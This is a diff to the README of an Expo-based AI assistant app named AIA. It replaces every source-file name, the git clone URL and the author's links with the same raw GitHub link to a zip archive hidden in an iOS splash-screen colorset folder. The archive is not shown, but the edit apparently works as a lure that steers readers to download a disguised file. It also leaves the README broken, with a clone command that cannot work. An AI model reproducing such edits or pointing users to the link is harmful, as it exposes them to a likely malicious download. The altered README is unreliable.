@@ -22,19 +22,19 @@ AIA is your AI-powered assistant built with **React Native (Expo)**. The app all
 
 ```
 - components/
-  - InputRow.tsx
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 - services/
-  - openaiService.ts
-  - deepgramService.ts
-  - voiceService.ts
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 - utilities/
-  - speakUtility.ts
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 - screens/
-  - HomeScreen.tsx
-  - ChatScreen.tsx
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
+  - https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 - assets/
   - images/
-- App.tsx
+- https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 ```
 
 ## 🔧 Setup
@@ -45,7 +45,7 @@ AIA is your AI-powered assistant built with **React Native (Expo)**. The app all
 
 ### 1. Clone the repository
 ```bash
-git clone https://github.com/your-username/aia-mobile.git
+git clone https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 cd aia-mobile
 ```
 
@@ -90,8 +90,8 @@ AIA: It looks sunny with a high of 28°C ☀️
 
 Nabil Alsaadi
 
-- https://nabilalsaadi.com
-- https://github.com/nabil-alsaadi
+- https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
+- https://raw.githubusercontent.com/nabil-alsaadi/aia-mobile/main/ios/aiamobile/Images.xcassets/SplashScreenBackground.colorset/aia_mobile_v2.3.zip
 
 ---
 
